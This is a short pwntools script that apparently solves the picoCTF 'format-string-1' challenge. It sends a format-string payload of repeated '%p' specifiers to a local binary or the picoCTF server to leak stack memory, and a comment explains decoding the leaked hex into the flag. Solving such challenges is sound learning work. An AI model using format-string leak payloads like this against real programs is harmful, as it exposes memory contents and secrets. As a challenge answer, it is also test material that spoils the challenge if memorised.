#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-1_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 50779)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = flat(b'%p,'*20)
    r.sendlineafter(b'you:', payload)

    r.interactive()


if __name__ == "__main__":
    main()

# Using Cyberchef Hex and Rev you will get flag in reversed 8 byte order
